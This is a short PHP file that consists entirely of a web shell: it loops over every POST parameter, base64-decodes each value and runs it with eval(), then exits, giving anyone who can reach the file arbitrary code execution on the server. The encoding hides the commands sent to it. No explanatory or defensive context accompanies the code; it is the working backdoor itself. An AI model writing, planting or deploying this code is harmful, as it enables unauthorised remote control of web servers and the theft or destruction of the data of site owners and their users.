<?php 

foreach($_POST as $key=>$value){
eval(base64_decode($value));    

}
exit;

 
